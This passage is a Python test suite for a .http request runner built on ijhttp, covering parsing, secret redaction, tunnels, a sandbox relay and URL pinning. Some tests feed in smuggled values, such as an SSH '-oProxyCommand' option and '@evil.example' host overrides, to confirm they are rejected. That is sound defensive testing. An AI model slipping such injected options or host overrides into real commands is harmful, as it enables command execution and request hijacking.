""".http runs on the host (httpclient.py): the parser, environment classes, scrubbing, the
ijhttp output parsers, and the Manager side - GUI runs, session tools with their cards and
refusals - against fake-ijhttp.py; plus the piperd routes."""
import base64
import json
import os
import re
import subprocess
import unittest
import urllib.parse

import _env
import common
import guard
import httpclient as hc

HERE = os.path.dirname(os.path.abspath(__file__))

FILE = """@base = {{acme.domain}}

### Login
POST {{base}}/api/login
Content-Type: application/json
Authorization: Basic {{user}} {{apiPassword}}

< ./body.json

> {%
  client.test("ok", () => client.assert(response.status === 200));
  client.global.set("sessionId", response.body.sessionId);
%}

### Detail
# @name detail
GET {{base}}/api/detail
    ?id=1
    &x=2
X-Session: {{sessionId}}

### Upload
POST https://upload.example.com/x
Content-Type: multipart/form-data; boundary=b

--b
< ./body.json
--b--

> ./check.js
"""

CONSOLE = """Request 'Login' POST https://api.example.com/api/login
= request =>
POST https://api.example.com/api/login
Authorization: Basic demo {{**apiPassword**}}
Content-Type: application/json

< /tmp/x/ref0-body.json

###

<= response =
HTTP/2 200 OK
content-type: application/json
set-cookie: sid=abc; Path=/

{"sessionId":"S-1",
 "echo":"Basic %s",
 "pw":"hunter22"}

Response code: 200 (OK); Time: 12ms (12 ms); Content length: 40 bytes (40 B)

Request 'detail' GET https://api.example.com/api/detail?id=1&x=2
WARN: api.example.com
java.net.UnknownHostException: api.example.com
\tat java.base/java.net.InetAddress.getAllByName0(InetAddress.java:1702)
Unable to get response for t.http#1:
java.net.UnknownHostException: api.example.com
""" % base64.b64encode(b"demo:hunter22").decode()

XML = """<?xml version="1.0" encoding="UTF-8"?>
<testsuites tests="5"><testsuite tests="5" name="t">
<testcase classname="http.Login" name="Response" time="0.1" />
<testcase classname="http.Login" name="ok" time="0.0" />
<testcase classname="http.Login" name="__piper_g__{&quot;sessionId&quot;:&quot;S-1&quot;}" time="0.0" />
<testcase classname="http.Login" name="Response Handler" time="0.1" />
<testcase classname="http.detail" name="Response" time="0.1"><failure type="Error" message="java.net.UnknownHostException: api.example.com" /></testcase>
</testsuite></testsuites>"""

ENV = {"dev": {"acme": {"domain": "https://api.example.com"}, "user": "demo"},
       "test": {"acme": {"domain": "https://api-test.example.com"}, "user": "demo"},
       "prod": {"acme": {"domain": "https://api.example.org"}, "user": "demo", "token": "pubsecret1"}}
PRIVATE = {"dev": {"apiPassword": "hunter22"}, "prod": {"apiPassword": "prodpass9"}}


class NoJavaTest(unittest.TestCase):
    """A fresh Linux / WSL has no Java: ijhttp's launcher fails, the error names the package."""

    def fake(self, body: str) -> str:
        import stat
        import tempfile
        d = tempfile.mkdtemp(prefix="nojava-")
        p = os.path.join(d, "ijhttp")
        with open(p, "w") as f:
            f.write("#!/bin/sh\n" + body + "\n")
        os.chmod(p, stat.S_IRWXU)
        return d, p

    def test_the_launcher_without_java(self):
        from unittest import mock
        d, p = self.fake("echo \"ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.\" >&2; exit 1")
        with mock.patch.object(hc, "java_env", return_value={"PATH": "/nonexistent"}):
            with self.assertRaises(hc.HttpError) as e:
                hc.run_ijhttp(p, d, "x.http", "dev", None, {}, False, 10)
            self.assertIn("openjdk-17", str(e.exception))
            # a failed request: ijhttp ran (a report) and its rc stands
            d, p = self.fake('while [ $# -gt 0 ]; do [ "$1" = -r ] && /bin/mkdir -p "$2" && : > "$2/report.xml"; shift; done; exit 1')
            self.assertEqual(hc.run_ijhttp(p, d, "x.http", "dev", None, {}, False, 10)[0], 1)


class ParserTest(unittest.TestCase):
    def test_parse_requests_names_spans_and_references(self):
        p = hc.parse(FILE)
        self.assertEqual([r["name"] for r in p["requests"]], ["Login", "Detail", "Upload"])
        login, detail, up = p["requests"]
        self.assertEqual((login["method"], login["url"]), ("POST", "{{base}}/api/login"))
        self.assertEqual(login["files"], ["./body.json"])
        self.assertEqual(FILE.split("\n")[login["handler"][1]].strip(), "%}")
        self.assertEqual(detail["url"], "{{base}}/api/detail?id=1&x=2")   # continuation lines
        self.assertEqual(detail["headers"], [["X-Session", "{{sessionId}}"]])
        self.assertEqual((up["handler_file"], up["files"]), ("./check.js", ["./body.json", "./check.js"]))
        self.assertEqual([v["name"] for v in p["vars"]], ["base"])
        self.assertEqual(login["body"], "< ./body.json")                      # up to the handler
        self.assertEqual(up["body"], "--b\n< ./body.json\n--b--")
        brief = hc.requests_brief(p)
        self.assertEqual((brief[0]["script"], brief[1]["script"], brief[2]["script"]), (True, False, True))
        self.assertEqual(brief[0]["headers"][0], ["Content-Type", "application/json"])
        self.assertEqual(hc.global_names(FILE), ["sessionId"])

    def test_unnamed_and_bare_url_requests(self):
        p = hc.parse("GET https://a.example/x\n\n###\nhttps://b.example/y\n")
        self.assertEqual([(r["name"], r["method"], r["url"]) for r in p["requests"]],
                         [("#1", "GET", "https://a.example/x"), ("#2", "GET", "https://b.example/y")])

    def test_instrument_adds_the_capture_to_each_request_it_can(self):
        p = hc.parse(FILE)
        out = hc.instrument(FILE, p, ["sessionId"])
        q = hc.parse(out)
        self.assertEqual(len(q["requests"]), 3)
        lines = out.split("\n")
        cap = [i for i, ln in enumerate(lines) if hc.CAPTURE in ln]
        self.assertEqual(len(cap), 2)                       # Login (into its handler), Detail (a new one)
        h0, h1 = q["requests"][0]["handler"]
        self.assertEqual(cap[0], h1)                        # on the %} line: no line added
        self.assertTrue(lines[h1].rstrip().endswith("%}"))
        rows = hc.instrument_rows([(ln, i) for i, ln in enumerate(FILE.split("\n"))], ["sessionId"])
        self.assertEqual(sum(1 for _, o in rows if o is None), 2)   # the new handler of Detail: a blank + one line
        self.assertIsNotNone(q["requests"][1]["handler"])
        self.assertEqual(q["requests"][2]["handler_file"], "./check.js")   # a handler file: left alone
        self.assertEqual(hc.instrument(FILE, p, []), FILE)
        inline = "GET https://a.example/\n\n> {% client.test('x', () => {}); %}\n"
        self.assertIn(hc.CAPTURE, hc.instrument(inline, hc.parse(inline), ["k"]).split("\n")[2])

    def test_single_keeps_the_file_variables(self):
        p = hc.parse(FILE)
        out = hc.single(FILE, p, 1)
        q = hc.parse(out)
        self.assertEqual([r["name"] for r in q["requests"]], ["Detail"])
        self.assertTrue(out.startswith("@base = {{acme.domain}}"))

    def test_relink_maps_the_run_copy_back_to_the_file_and_line(self):
        rows = hc.single_rows(FILE, hc.parse(FILE), 1)
        rows = hc.instrument_rows(rows, ["sessionId"])
        lm = [o for _, o in rows]
        n = next(i for i, (t, _) in enumerate(rows) if t.startswith("GET"))
        msg = "AssertionError\n  :=> (at /w/tmp/abc/api.http:%d)" % (n + 1)
        self.assertEqual(hc.relink(msg, "/w/tmp/abc/api.http", "http-client/api.http", lm),
                         "AssertionError\n  :=> (at http-client/api.http:%d)" % (FILE.split("\n").index("GET {{base}}/api/detail") + 1))

    def test_rewrite_refs(self):
        out = hc.rewrite_refs(FILE, {"./body.json": "/w/ref0-body.json", "./check.js": "/w/ref1-check.js"})
        self.assertIn("< /w/ref0-body.json", out)
        self.assertIn("> /w/ref1-check.js", out)
        self.assertNotIn("./body.json", out)

    def test_classes(self):
        for name, cls in [("dev", "dev"), ("local", "dev"), ("test", "test"), ("staging", "test"),
                          ("preprod", "test"), ("prod", "prod"), ("production", "prod"),
                          ("test with tunel `ssh -L 8443:192.0.2.1:443 p@x`", "test"),
                          ("prod with tunel `ssh -L 8443:192.0.2.129:443 p@y`", "prod"),
                          ("customer", "prod"), ("devops-prod", "prod")]:
            self.assertEqual(hc.classify(name), cls, name)
        self.assertEqual(hc.classify("customer", "test"), "test")

    def test_substitute_hosts_and_secrets(self):
        vals = hc.flatten(ENV["dev"])
        vals["base"] = hc.substitute("{{acme.domain}}", vals)
        self.assertEqual(hc.substitute("{{base}}/x?{{nope}}", vals), "https://api.example.com/x?{{nope}}")
        self.assertEqual(hc.url_host("https://API.example.com:8443/x"), "api.example.com")
        self.assertIsNone(hc.url_host("{{host}}/x"))
        self.assertEqual(hc.hosts_in("https://a.example.com/x and http://b.example:80"), {"a.example.com", "b.example"})
        self.assertEqual(hc.hosts_in("api.example.com"), {"api.example.com"})
        self.assertEqual(hc.hosts_in("demo"), set())
        self.assertEqual(hc.secret_values(ENV["prod"], PRIVATE["prod"]), ["pubsecret1", "prodpass9"])

    def test_scrub_masks_plain_encoded_and_basic_auth(self):
        scrub = hc.redactor(["hunter22"])
        basic = base64.b64encode(b"demo:hunter22").decode()
        out = scrub('pw=hunter22 q=hunter%%32%%32 b64=%s auth="Basic %s" ok=hello123456789' % (
            base64.b64encode(b"hunter22").decode(), basic))
        self.assertNotIn("hunter22", out)
        self.assertNotIn(basic, out)
        self.assertIn("ok=hello123456789", out)
        self.assertEqual(hc.redactor([])("x"), "x")
        self.assertEqual(hc.mask_headers([["Set-Cookie", "a"], ["Content-Type", "x"], ["X-Api-Key", "k"]]),
                         [["Set-Cookie", hc.MASK], ["Content-Type", "x"], ["X-Api-Key", hc.MASK]])

    def test_cookie_values_are_collected_for_masking(self):
        reqs = [{"headers": [["set-cookie", "sid=s%3AAbCdEfGh12; Path=/"], ["content-type", "x"]],
                 "req_headers": [["Cookie", "a=short; b=LongCookieValue1"]]}]
        vals = hc.cookie_values(reqs)
        self.assertIn("s%3AAbCdEfGh12", vals)
        self.assertIn("s:AbCdEfGh12", vals)
        self.assertIn("LongCookieValue1", vals)
        self.assertNotIn("short", vals)

    def test_console_and_junit(self):
        reqs = hc.merge(hc.parse_console(CONSOLE), hc.parse_junit(XML))
        self.assertEqual(len(reqs), 2)
        a, b = reqs
        self.assertEqual((a["name"], a["status"], a["time_ms"], a["ok"]), ("Login", 200, 12, True))
        self.assertTrue(a["body"].startswith('{"sessionId":"S-1",') and a["body"].endswith('"pw":"hunter22"}'))
        self.assertIn(["set-cookie", "sid=abc; Path=/"], a["headers"])
        self.assertEqual(a["tests"], [{"name": "ok", "ok": True, "message": ""}])
        self.assertEqual(a["globals"], {"sessionId": "S-1"})
        self.assertFalse(b["ok"])
        self.assertIn("UnknownHostException", b["error"])
        self.assertEqual(hc.parse_junit('<!DOCTYPE x [<!ENTITY a "b">]><testsuites/>'), [])

    def test_junit_pre_request_handler_belongs_to_its_response_not_an_extra_request(self):
        # Real ijhttp 2026.1 emits Pre-request Handler before Response; names may repeat.
        for pre_first in (False, True):
            with self.subTest(pre_first=pre_first):
                xml = ('<testsuites><testsuite>' +
                       ('<testcase classname="http.Same" name="Pre-request Handler" />' if pre_first else '') +
                       '<testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="first assertion" />'
                       '<testcase classname="http.Same" name="Pre-request Handler" />'
                       '<testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="second assertion" />'
                       '<testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="third assertion" />'
                       '</testsuite></testsuites>')
                result = hc.parse_junit(xml)
                self.assertEqual([[t["name"] for t in r["tests"]] for r in result],
                                 [["first assertion"], ["second assertion"], ["third assertion"]])

    def test_failed_pre_request_handler_is_preserved_on_its_own_request(self):
        xml = ('<testsuites><testsuite><testcase name="Response" /><testcase name="first assertion" />'
               '<testcase name="Pre-request Handler"><failure message="synthetic pre failure" /></testcase>'
               '<testcase name="Response" /><testcase name="second assertion" />'
               '</testsuite></testsuites>')
        result = hc.parse_junit(xml)
        self.assertEqual(result[0]["tests"], [{"name": "first assertion", "ok": True, "message": ""}])
        self.assertEqual(result[1]["tests"][0], {"name": "Pre-request Handler", "ok": False, "message": "synthetic pre failure"})

    def test_user_test_named_pre_request_handler_is_not_a_request_boundary(self):
        # The real engine permits this name and emits Response Handler after a user's response tests.
        # All request names/classnames may coincide: classname alone cannot determine the boundary.
        for failed in (False, True):
            with self.subTest(failed=failed):
                xml = ('<testsuites><testsuite><testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="Pre-request Handler">' +
                       ('<failure message="user assertion failed" />' if failed else '') + '</testcase>'
                       '<testcase classname="http.Same" name="Response Handler" />'
                       '<testcase classname="http.Same" name="Pre-request Handler" />'
                       '<testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="second assertion" />'
                       '<testcase classname="http.Same" name="Response Handler" />'
                       '<testcase classname="http.Same" name="Response" />'
                       '<testcase classname="http.Same" name="third assertion" />'
                       '</testsuite></testsuites>')
                result = hc.parse_junit(xml)
                self.assertEqual(len(result), 3)
                self.assertEqual(result[0]["tests"], [{"name": "Pre-request Handler", "ok": not failed,
                                                       "message": "user assertion failed" if failed else ""}])
                self.assertEqual([t["name"] for t in result[1]["tests"]], ["second assertion"])
                self.assertEqual([t["name"] for t in result[2]["tests"]], ["third assertion"])


class CookieDirectiveTest(unittest.TestCase):
    def test_only_explicit_late_preamble_directives_move_and_keep_original_lines(self):
        cases = [
            ('### Inline\n< {% const x = 1; %}\n# @no-cookie-jar\nGET https://a.example/\n',
             [0, 2, 1, 3, 4]),
            ('@base = https://a.example\n### External\n< ./pre.js\n# @no-cookie-jar\nGET {{base}}/\n',
             [0, 1, 3, 2, 4, 5]),
            ('< {%\n const x = 1;\n%}\n# @no-cookie-jar\nGET https://a.example/\n',
             [3, 0, 1, 2, 4, 5]),
            ('### Duplicates\n# @no-cookie-jar\n< ./pre.js\n# @no-cookie-jar\nGET https://a.example/\n',
             [0, 1, 2, 3, 4, 5]),
            ('### Late duplicates\n< ./pre.js\n# @no-cookie-jar\n# @no-cookie-jar\nGET https://a.example/\n',
             [0, 2, 1, 3, 4, 5]),
            ('@base = https://a.example\n# comment\n< ./pre.js\n//   @no-cookie-jar\nGET {{base}}/\n',
             [0, 1, 3, 2, 4, 5]),
            ('### Script literal and outer directive\n< {%\n const x = `\n# @no-cookie-jar\n`;\n%}\n# @no-cookie-jar\nGET https://a.example/\n',
             [0, 6, 1, 2, 3, 4, 5, 7, 8]),
            ('### Two scripts\n< {%\n const x = `\n// @no-cookie-jar\n`;\n%}\n< {% const y = 1; %}\n# @no-cookie-jar\nGET https://a.example/\n',
             [0, 7, 1, 2, 3, 4, 5, 6, 8, 9]),
        ]
        for text, order in cases:
            with self.subTest(text=text):
                rows = [(line, i) for i, line in enumerate(text.split("\n"))]
                out = hc.cookie_jar_rows(rows)
                self.assertEqual(out, [rows[i] for i in order])
                self.assertEqual(hc.cookie_jar_rows(out), out)
                self.assertEqual(sorted(out, key=lambda row: row[1]), rows)

    def test_scripts_body_handlers_and_correct_or_absent_directives_stay_unchanged(self):
        texts = [
            '### Correct\n# @no-cookie-jar\n< {% const x = 1; %}\nGET https://a.example/\n',
            '### No directive\n< ./pre.js\nGET https://a.example/\nCookie: manual=synthetic\n',
            '### Script literal\n< {%\n const x = `\n# @no-cookie-jar\n`;\n%}\nGET https://a.example/\n',
            '### Body\n< ./pre.js\nPOST https://a.example/\nContent-Type: text/plain\n\n# @no-cookie-jar\n',
            '### Handler\nGET https://a.example/\n\n> {%\n const x = `\n# @no-cookie-jar\n`;\n%}\n',
            '### Similar comment\n< ./pre.js\n# @no-cookie-jar-example\nGET https://a.example/\n',
            '### No script\n# @no-cookie-jar\nGET https://a.example/\n',
            '### Trailing comment\n< ./pre.js\n# @no-cookie-jar # explanation\nGET https://a.example/\n',
        ]
        for text in texts:
            with self.subTest(text=text):
                rows = [(line, i) for i, line in enumerate(text.split("\n"))]
                self.assertEqual(hc.cookie_jar_rows(rows), rows)

    def test_single_request_keeps_variables_other_blocks_and_error_line_mapping(self):
        text = ('@base = https://a.example\n### Other\nGET {{base}}/other\n\n'
                '### Selected\n< {%\n throw new Error("probe");\n%}\n# @no-cookie-jar\nGET {{base}}/selected\n')
        rows = hc.single_rows(text, hc.parse(text), 1)
        out = hc.cookie_jar_rows(rows)
        sent = "\n".join(line for line, _ in out)
        self.assertLess(sent.index("# @no-cookie-jar"), sent.index("< {%"))
        self.assertIn("@base = https://a.example", sent)
        self.assertNotIn("/other", sent)
        error_line = next(i for i, (line, _) in enumerate(out) if "throw new Error" in line)
        mapped = hc.relink("/tmp/run.http:%d" % (error_line + 1), "/tmp/run.http", "original.http", [o for _, o in out])
        self.assertEqual(mapped, "original.http:7")
        # The synthetic ### row and the first source row share an origin when the source has no ###.
        bare = '< {% const x = 1; %}\n# @no-cookie-jar\nGET https://a.example/\n'
        out = hc.cookie_jar_rows(hc.single_rows(bare, hc.parse(bare), 0))
        self.assertEqual([line for line, _ in out][:4], ['', '### #1', '# @no-cookie-jar', '< {% const x = 1; %}'])

    def test_untitled_request_with_variables_composes_with_sandbox_rewrites(self):
        text = ('@base = http://localhost:12000\n< {% const x = 1; %}\n# @no-cookie-jar\n'
                'GET {{base}}/cookie\n')
        parsed = hc.parse(text)
        for index in (None, 0):
            with self.subTest(index=index):
                rows = ([(line, i) for i, line in enumerate(text.split("\n"))] if index is None else
                        hc.single_rows(text, parsed, index))
                rows = hc.cookie_jar_rows(rows)
                rows = hc.no_redirect_rows(rows, parsed["requests"])
                rows, _ = hc.pin_rows(rows, text, parsed["requests"], {"base": "http://localhost:12000"})
                sent = "\n".join(line for line, _ in rows)
                self.assertLess(sent.index("# @no-cookie-jar"), sent.index("< {%"))
                self.assertLess(sent.index("# @no-redirect"), sent.index("< {%"))
                self.assertIn("GET http://localhost:12000/cookie", sent)


class TunnelSaveHelpersTest(unittest.TestCase):
    """Tunnels Piper opens, the hints of a failed request, a response saved to a file (2026-10-06)."""
    NAME = "test with tunel `ssh -L 8443:192.0.2.1:443 projects@test-careers.example.com`"

    def test_tunnel_from_the_environment_name(self):
        t = hc.tunnel_spec(self.NAME, {}, {"domain": "https://localhost:8443"}, from_name=True)
        self.assertEqual((t["kind"], t["ssh"], t["host"], t["rport"], t["port"]),
                         ("ssh", {"host": "test-careers.example.com", "user": "projects"}, "192.0.2.1", 443, 8443))
        self.assertIn("projects@test-careers.example.com -> 192.0.2.1:443", t["label"])
        self.assertIsNone(hc.tunnel_spec(self.NAME, {}, {}, from_name=False))   # an untrusted file: the name is just a name
        self.assertIsNone(hc.tunnel_spec("test", {}, {"domain": "https://localhost:8443"}, from_name=True))
        with self.assertRaises(hc.HttpError):                                    # never an option smuggled in as the server
            hc.tunnel_spec("ssh -L 1:h:2 -oProxyCommand=x", {}, {}, from_name=True) or \
                hc.tunnel_spec("x", {"ssh": "-oProxyCommand=x", "forward": "h:1", "port": 1}, {}, True)

    def test_tunnel_declared_in_the_piper_object(self):
        t = hc.tunnel_spec("test", {"tunnel": "test/app"}, {"base": "http://localhost:18080/api"}, True)
        self.assertEqual((t["kind"], t["env"], t["target"], t["port"]), ("stack", "test", "app", 18080))
        t = hc.tunnel_spec("x", {"ssh": "u@bastion.example:2222", "forward": "10.0.0.1:443", "port": 9443}, {}, True)
        self.assertEqual((t["ssh"], t["host"], t["rport"], t["port"]),
                         ({"host": "bastion.example", "user": "u", "port": 2222}, "10.0.0.1", 443, 9443))
        for meta, vals in (({"tunnel": "dev/app"}, {"a": "http://localhost:1"}),        # dev has no tunnels
                           ({"tunnel": "test/app"}, {"a": "http://localhost:1", "b": "http://127.0.0.1:2"}),   # which port?
                           ({"tunnel": "test/app"}, {}),
                           ({"ssh": "u@h"}, {"a": "http://localhost:1"}),               # no forward
                           ({"tunnel": "test/app", "port": True}, {})):
            with self.assertRaises(hc.HttpError, msg=meta):
                hc.tunnel_spec("x", meta, vals, True)

    def test_port_rewrite(self):
        self.assertEqual(hc.port_rewrite("https://localhost:8443/a http://127.0.0.1:8443 localhost:84430 x:8443", 8443, 43400),
                         "https://localhost:43400/a http://127.0.0.1:43400 localhost:84430 x:8443")
        doc = {"t": {"d": "https://localhost:8443", "n": {"u": "localhost:8443/x"}, "k": 1}, "o": {"d": "https://localhost:8443"}}
        self.assertEqual(hc.rewrite_env(doc, "t", 8443, 1),
                         {"t": {"d": "https://localhost:1", "n": {"u": "localhost:1/x"}, "k": 1}, "o": {"d": "https://localhost:8443"}})

    def test_settings_of_an_environment_are_not_variables_or_secrets(self):
        env = {"domain": "https://a.example", "pw": "hunter22", hc.SSL_KEY: {"verifyHostCertificate": False},
               hc.META_KEY: {"tunnel": "test/app", "port": 8443}}
        self.assertEqual(sorted(hc.flatten(env)), ["domain", "pw"])
        self.assertEqual(sorted(hc.leaves(env)), ["domain", "pw"])
        self.assertEqual(hc.secret_values(env, {}, public_hidden=True), ["hunter22"])   # never "false" or "8443"
        self.assertEqual(hc.env_meta({"t": env}, {"t": {hc.META_KEY: {"port": 1}}}, "t"),
                         ({"tunnel": "test/app", "port": 1}, {"verifyHostCertificate": False}))

    def test_hints(self):
        pkix = "javax.net.ssl.SSLHandshakeException: (certificate_unknown) PKIX path building failed: x"
        self.assertIn("verifyHostCertificate", hc.hint_error(pkix, "https://localhost:8443/api"))
        refused = "java.net.ConnectException: Connection refused"
        self.assertIn('"piper"', hc.hint_error(refused, "https://localhost:8443/api"))
        self.assertEqual(hc.hint_error(refused, "https://api.example.com/"), refused)
        self.assertEqual(hc.hint_error("", "x"), "")
        once = hc.hint_error(pkix, "u")
        self.assertEqual(hc.hint_error(once, "u"), once)

    def test_text_or_binary_and_secret_hits(self):
        self.assertTrue(hc.is_text("application/json; charset=utf-8"))
        self.assertTrue(hc.is_text("application/problem+json"))
        self.assertTrue(hc.is_text("text/csv"))
        self.assertFalse(hc.is_text("application/pdf"))
        self.assertFalse(hc.is_text("", b"%PDF\0\1"))
        self.assertTrue(hc.is_text("", b"plain"))
        self.assertTrue(hc.secret_hits(b"x" + base64.b64encode(b"hunter22") + b"y", ["hunter22"]))
        self.assertTrue(hc.secret_hits(b"..hunter22..", ["hunter22"]))
        self.assertFalse(hc.secret_hits(b"%PDF nothing", ["hunter22"]))

    def test_review_fixes(self):
        basic = b"\0AUTH=Basic " + base64.b64encode(b"user:hunter22")
        self.assertTrue(hc.secret_hits(basic, ["hunter22"]))                       # a decoded token, misaligned
        self.assertEqual(hc.port_rewrite("https://app.localhost:8443 mylocalhost:8443 (localhost:8443)", 8443, 1),
                         "https://app.localhost:8443 mylocalhost:8443 (localhost:1)")
        self.assertEqual(hc.flatten({"piper": "https://p.example", "SSLConfiguration": "x"}),
                         {"piper": "https://p.example", "SSLConfiguration": "x"})   # a plain variable of that name
        self.assertIsNone(hc.tunnel_spec(self.NAME, {"tunnel": False}, {}, True))     # opt-out: the user opens it
        self.assertTrue(hc.is_text("application/yaml"))

    def test_redirects_are_never_followed(self):
        self.assertIsNone(hc._NoRedirect().redirect_request(None, None, 302, "Found", {}, "https://evil.example/"))


def git(root, *args):
    subprocess.run(["git", "-C", root, "-c", "user.email=t@t", "-c", "user.name=t", *args], check=True,
                   capture_output=True)


class SandboxRelayTest(unittest.TestCase):
    """The relay into a session's sandbox, with this process standing in for the container."""
    def server(self):
        import http.server
        import threading

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                body = ("hello " + self.path).encode()
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        return srv.server_address[1]

    def test_requests_reach_the_service_through_the_relay(self):
        import sys
        import urllib.request
        port = self.server()
        relay = hc.SandboxRelay([sys.executable, "-c", hc.RELAY_SCRIPT, "127.0.0.1", str(port)])
        self.addCleanup(relay.close)
        self.assertNotEqual(relay.port, port)
        for path in ("/a", "/b?x=1"):   # one exec per connection
            with urllib.request.urlopen("http://127.0.0.1:%d%s" % (relay.port, path), timeout=10) as r:
                self.assertEqual(r.read(), ("hello " + path).encode())
        relay.close()
        with self.assertRaises(OSError):
            urllib.request.urlopen("http://127.0.0.1:%d/c" % relay.port, timeout=3)

    def test_a_connection_accepted_while_closing_does_not_leave_a_process(self):
        import sys
        import time
        relay = hc.SandboxRelay([sys.executable, "-c", "import time; time.sleep(60)"])
        relay.closed = True   # close() has begun: a connection _serve accepted just before starts its exec now

        class Conn:
            def recv(self, n):
                time.sleep(0.2)
                return b""

            def sendall(self, b):
                pass

            def shutdown(self, how):
                pass

            def close(self):
                pass
        t0 = time.time()
        relay._pipe(Conn())
        self.assertLess(time.time() - t0, 30)
        self.assertTrue(all(p.poll() is not None for p in relay.procs))
        relay.close()

    def test_probe(self):
        import socket
        import sys
        port = self.server()
        ok = subprocess.run([sys.executable, "-c", hc.RELAY_SCRIPT, "127.0.0.1", str(port), "probe"], timeout=20)
        self.assertEqual(ok.returncode, 0)
        with socket.socket() as so:
            so.bind(("127.0.0.1", 0))
            free = so.getsockname()[1]
        no = subprocess.run([sys.executable, "-c", hc.RELAY_SCRIPT, "127.0.0.1", str(free), "probe"], timeout=20)
        self.assertEqual(no.returncode, 1)

    def test_local_ports_and_no_redirect_rows(self):
        self.assertEqual(hc.local_ports(["http://localhost:8080/a", "localhost:8080/b"]), {8080: "localhost"})
        self.assertEqual(hc.local_ports(["http://127.0.0.1:1/a", "https://localhost:2"]), {1: "127.0.0.1", 2: "localhost"})
        for urls in (["http://localhost/a"], ["http://localhost:1/a", "https://example.com:1/"],
                     ["http://localhost:1", "http://127.0.0.1:1"], ["{{host}}/a"], []):
            self.assertIsNone(hc.local_ports(urls), urls)
        # at the top of each request's block: ijhttp ignores `# @no-redirect` below a pre-request script
        # (inline or `< ./x.js`) and follows the redirect (verified, 2026.1)
        text = "@a = 1\n### A\n# c\nGET http://localhost:1/a\n\n### B\n< {%\n x\n%}\nPOST http://localhost:1/b\n"
        parsed = hc.parse(text)
        rows = hc.no_redirect_rows([(ln, i) for i, ln in enumerate(text.split("\n"))], parsed["requests"])
        got = [t for t, _ in rows]
        self.assertEqual(got[1:4], ["### A", "# @no-redirect", "# c"])
        self.assertEqual(got[got.index("### B"):got.index("### B") + 3], ["### B", "# @no-redirect", "< {%"])
        self.assertEqual(sum(1 for t, _ in rows if t == "# @no-redirect"), 2)
        text = "@a = 1\n< ./pre.js\nGET http://localhost:1/a\n"   # a block without `###`: above it all
        rows = hc.no_redirect_rows([(ln, i) for i, ln in enumerate(text.split("\n"))], hc.parse(text)["requests"])
        self.assertEqual([t for t, _ in rows][:2], ["# @no-redirect", "@a = 1"])
        parsed = hc.parse(text)
        rows = hc.no_redirect_rows(hc.single_rows(text, parsed, 0), parsed["requests"])   # its `### #1` row
        self.assertEqual([t for t, _ in rows][:4], ["", "### #1", "# @no-redirect", "@a = 1"])
        self.assertEqual(hc.url_var_names(["{{base}}/x"], {"base": "{{host}}:{{port}}"}), {"base", "host", "port"})
        self.assertIsNone(hc.local_ports(["file://localhost:1/etc/hosts"]))   # http(s) only

    def test_url_head_and_pin_url(self):
        self.assertEqual(hc.url_head("{{base}}/a/{{id}}?x=1"), ("{{base}}", "/a/{{id}}?x=1"))
        self.assertEqual(hc.url_head("http://localhost:{{p}}/a"), ("http://localhost:{{p}}", "/a"))
        self.assertEqual(hc.url_head("localhost:1?a={{x/y}}"), ("localhost:1", "?a={{x/y}}"))
        self.assertEqual(hc.url_head("http://h:1"), ("http://h:1", ""))
        v = {"base": "http://LOCALHOST:8080/api", "p": "8080"}
        self.assertEqual(hc.pin_url("{{base}}/u/{{id}}", v), "http://localhost:8080/api/u/{{id}}")
        self.assertEqual(hc.pin_url("http://localhost:{{p}}?q={{id}}", v), "http://localhost:8080/?q={{id}}")
        self.assertEqual(hc.pin_url("http://u:pw@localhost:8080", v), "http://localhost:8080/")
        # a value set at run time can only land behind the written-out host
        for value in ("@evil.example/x", "//evil.example/x", "\\@evil.example"):
            pinned = hc.pin_url("http://localhost:8080/{{id}}", v).replace("{{id}}", value)
            self.assertEqual(urllib.parse.urlsplit(pinned).hostname, "localhost", value)
        for bad in ("http://localhost:{{q}}/a", "{{nope}}/a", "http://localhost/a"):
            with self.assertRaises(hc.HttpError, msg=bad):
                hc.pin_url(bad, v)

    def test_url_head_takes_a_scheme_in_a_variable(self):
        # `{{scheme}}://{{host}}:{{port}}` pinned before the change; the head must not stop at `{{scheme}}:`
        self.assertEqual(hc.url_head("{{scheme}}://{{host}}:{{port}}/a/{{id}}"),
                         ("{{scheme}}://{{host}}:{{port}}", "/a/{{id}}"))
        self.assertEqual(hc.url_head("{{base}}/a://b"), ("{{base}}", "/a://b"))
        self.assertEqual(hc.url_head("localhost:8080/x?u=http://evil"), ("localhost:8080", "/x?u=http://evil"))
        v = {"scheme": "http", "host": "localhost", "port": "8080"}
        self.assertEqual(hc.pin_url("{{scheme}}://{{host}}:{{port}}/a/{{id}}", v), "http://localhost:8080/a/{{id}}")

    def test_the_relay_passes_a_binary_body_as_text_plain(self):
        # ijhttp 2026.1 cancels most runs on a binary body (1/5 with image/png, 5/5 as text/plain, verified):
        # the relay rewrites the Content-Type of the first response head, the bytes stay as they are
        import http.server
        import sys
        import threading
        import urllib.request
        png, seen = b"\x89PNG\r\n\x1a\n\0\xff" * 50, []

        class H(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def do_GET(self):
                seen.append(self.headers.get("Connection"))
                ct = {"/png": "image/png", "/hal": "application/hal+json", "/spoof": "text/plain"}.get(self.path)
                body = png if self.path == "/png" else b'{"a":1}'
                self.send_response(200)
                if ct:
                    self.send_header("Content-Type", ct)
                if self.path == "/spoof":   # only the relay may set it: the record trusts it
                    self.send_header(hc.RELAY_CT, "image/png")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        relay = hc.SandboxRelay([sys.executable, "-c", hc.RELAY_SCRIPT, "127.0.0.1", str(srv.server_address[1])])
        self.addCleanup(relay.close)
        got = {}
